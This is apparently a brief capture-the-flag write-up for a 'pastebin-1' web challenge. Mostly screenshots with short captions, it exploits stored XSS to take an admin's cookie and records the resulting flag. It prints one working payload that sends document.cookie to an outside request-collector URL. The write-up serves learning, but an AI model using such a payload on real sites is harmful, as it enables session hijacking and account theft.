# pastebin-1

<p align="center">
    <img src="images/pastebin-1.png" style="border: 0.8px solid black" caption="Challenge" /><br/>
</p>

Notice that the website is vulnerable to XSS

<p align="center">
    <img src="images/pastebin-2.png" style="border: 0.8px solid black" caption="Challenge" /><br/>
</p>

<p align="center">
    <img src="images/pastebin-3.png" style="border: 0.8px solid black" caption="Challenge" /><br/>
</p>

Use [requestbin](https://requestbin.com/) to receive web response.

Exploit XSS vulnerability to obtain admin cookie

`<script>new Image().src="https://enfai4qtftdcn.x.pipedream.net?c="+document.cookie;</script>`

<p align="center">
    <img src="images/pastebin-4.png" style="border: 0.8px solid black" caption="Challenge" /><br/>
</p>

Use the admin page to access the vulnerable page.

<p align="center">
    <img src="images/pastebin-5.png" style="border: 0.8px solid black" caption="Challenge" /><br/>
</p>

Got the flag on requestbin

<p align="center">
    <img src="images/pastebin-6.png" style="border: 0.8px solid black" caption="Challenge" /><br/>
</p>

Flag: `flag{d1dn7_n33d_70_b3_1n_ru57}`